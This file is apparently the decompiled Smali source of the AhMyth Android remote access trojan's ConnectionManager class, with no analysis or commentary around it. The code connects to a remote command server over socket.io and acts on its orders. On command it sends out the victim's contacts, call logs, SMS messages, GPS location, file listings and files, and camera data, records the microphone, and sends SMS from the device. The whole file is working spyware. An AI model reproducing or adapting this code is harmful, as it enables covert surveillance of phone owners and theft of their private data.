.class public Lahmyth/mine/king/ahmyth/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# static fields
.field public static context:Landroid/content/Context;

.field private static fm:Lahmyth/mine/king/ahmyth/FileManager;

.field private static ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 32
    new-instance v0, Lahmyth/mine/king/ahmyth/FileManager;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/FileManager;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->fm:Lahmyth/mine/king/ahmyth/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$000()Lio/socket/client/Socket;
    .locals 1

    .prologue
    .line 27
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method

.method public static sendReq()V
    .locals 4

    .prologue
    .line 53
    :try_start_0
    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v1, :cond_0

    .line 125
    .local v0, "ex":Ljava/lang/Exception;
    :goto_0
    return-void

    .line 56
    .end local v0    # "ex":Ljava/lang/Exception;
    :cond_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getInstance()Lahmyth/mine/king/ahmyth/IOSocket;

    move-result-object v1

    invoke-virtual {v1}, Lahmyth/mine/king/ahmyth/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v1

    sput-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    .line 59
    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v2, "ping"

    new-instance v3, Lahmyth/mine/king/ahmyth/ConnectionManager$1;

    invoke-direct {v3}, Lahmyth/mine/king/ahmyth/ConnectionManager$1;-><init>()V

    invoke-virtual {v1, v2, v3}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 66
    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v2, "order"

    new-instance v3, Lahmyth/mine/king/ahmyth/ConnectionManager$2;

    invoke-direct {v3}, Lahmyth/mine/king/ahmyth/ConnectionManager$2;-><init>()V

    invoke-virtual {v1, v2, v3}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 117
    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v1}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 119
    :catch_0
    move-exception v0

    .line 121
    .restart local v0    # "ex":Ljava/lang/Exception;
    const-string v1, "errrr"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 1
    .param p0, "con"    # Landroid/content/Context;

    .prologue
    .line 37
    :try_start_0
    sput-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    .line 38
    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 43
    :goto_0
    return-void

    .line 39
    :catch_0
    move-exception v0

    .line 40
    .local v0, "ex":Ljava/lang/Exception;
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    goto :goto_0
.end method

.method public static x0000ca(I)V
    .locals 5
    .param p0, "req"    # I

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x1

    .line 129
    const/4 v1, -0x1

    if-ne p0, v1, :cond_1

    .line 130
    new-instance v1, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1}, Lahmyth/mine/king/ahmyth/CameraManager;->findCameraList()Lorg/json/JSONObject;

    move-result-object v0

    .line 131
    .local v0, "cameraList":Lorg/json/JSONObject;
    if-eqz v0, :cond_0

    .line 132
    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v2, "x0000ca"

    new-array v3, v3, [Ljava/lang/Object;

    aput-object v0, v3, v4

    invoke-virtual {v1, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 141
    .end local v0    # "cameraList":Lorg/json/JSONObject;
    :cond_0
    :goto_0
    return-void

    .line 134
    :cond_1
    if-ne p0, v3, :cond_2

    .line 135
    new-instance v1, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v3}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V

    goto :goto_0

    .line 137
    :cond_2
    if-nez p0, :cond_0

    .line 138
    new-instance v1, Lahmyth/mine/king/ahmyth/CameraManager;

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v1, v2}, Lahmyth/mine/king/ahmyth/CameraManager;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v4}, Lahmyth/mine/king/ahmyth/CameraManager;->startUp(I)V

    goto :goto_0
.end method

.method public static x0000cl()V
    .locals 5

    .prologue
    .line 162
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "x0000cl"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-static {}, Lahmyth/mine/king/ahmyth/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 163
    return-void
.end method

.method public static x0000cn()V
    .locals 5

    .prologue
    .line 166
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "x0000cn"

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-static {}, Lahmyth/mine/king/ahmyth/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 167
    return-void
.end method

.method public static x0000fm(ILjava/lang/String;)V
    .locals 5
    .param p0, "req"    # I
    .param p1, "path"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x1

    .line 144
    if-nez p0, :cond_1

    .line 145
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "x0000fm"

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    sget-object v4, Lahmyth/mine/king/ahmyth/ConnectionManager;->fm:Lahmyth/mine/king/ahmyth/FileManager;

    invoke-static {p1}, Lahmyth/mine/king/ahmyth/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v4

    aput-object v4, v2, v3

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 148
    :cond_0
    :goto_0
    return-void

    .line 146
    :cond_1
    if-ne p0, v2, :cond_0

    .line 147
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->fm:Lahmyth/mine/king/ahmyth/FileManager;

    invoke-static {p1}, Lahmyth/mine/king/ahmyth/FileManager;->downloadFile(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public static x0000lm()V
    .locals 11
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    const/4 v10, 0x1

    const/4 v9, 0x0

    .line 174
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 175
    new-instance v0, Lahmyth/mine/king/ahmyth/LocManager;

    sget-object v6, Lahmyth/mine/king/ahmyth/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v6}, Lahmyth/mine/king/ahmyth/LocManager;-><init>(Landroid/content/Context;)V

    .line 176
    .local v0, "gps":Lahmyth/mine/king/ahmyth/LocManager;
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 178
    .local v1, "location":Lorg/json/JSONObject;
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->canGetLocation()Z

    move-result v6

    if-eqz v6, :cond_0

    .line 180
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->getLatitude()D

    move-result-wide v2

    .line 181
    .local v2, "latitude":D
    invoke-virtual {v0}, Lahmyth/mine/king/ahmyth/LocManager;->getLongitude()D

    move-result-wide v4

    .line 182
    .local v4, "longitude":D
    const-string v6, "loc"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v2, v3}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, "   ,  "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4, v5}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 183
    const-string v6, "enable"

    invoke-virtual {v1, v6, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 184
    const-string v6, "lat"

    invoke-virtual {v1, v6, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 185
    const-string v6, "lng"

    invoke-virtual {v1, v6, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 190
    .end local v2    # "latitude":D
    .end local v4    # "longitude":D
    :goto_0
    sget-object v6, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v7, "x0000lm"

    new-array v8, v10, [Ljava/lang/Object;

    aput-object v1, v8, v9

    invoke-virtual {v6, v7, v8}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 191
    return-void

    .line 188
    :cond_0
    const-string v6, "enable"

    invoke-virtual {v1, v6, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    goto :goto_0
.end method

.method public static x0000mc(I)V
    .locals 0
    .param p0, "sec"    # I
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 170
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/MicManager;->startRecording(I)V

    .line 171
    return-void
.end method

.method public static x0000sm(ILjava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p0, "req"    # I
    .param p1, "phoneNo"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .prologue
    const/4 v5, 0x0

    const/4 v3, 0x1

    .line 152
    if-nez p0, :cond_1

    .line 153
    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v2, "x0000sm"

    new-array v3, v3, [Ljava/lang/Object;

    invoke-static {}, Lahmyth/mine/king/ahmyth/SMSManager;->getSMSList()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v3, v5

    invoke-virtual {v1, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 158
    :cond_0
    :goto_0
    return-void

    .line 154
    :cond_1
    if-ne p0, v3, :cond_0

    .line 155
    invoke-static {p1, p2}, Lahmyth/mine/king/ahmyth/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    .line 156
    .local v0, "isSent":Z
    sget-object v1, Lahmyth/mine/king/ahmyth/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v2, "x0000sm"

    new-array v3, v3, [Ljava/lang/Object;

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    aput-object v4, v3, v5

    invoke-virtual {v1, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_0
.end method
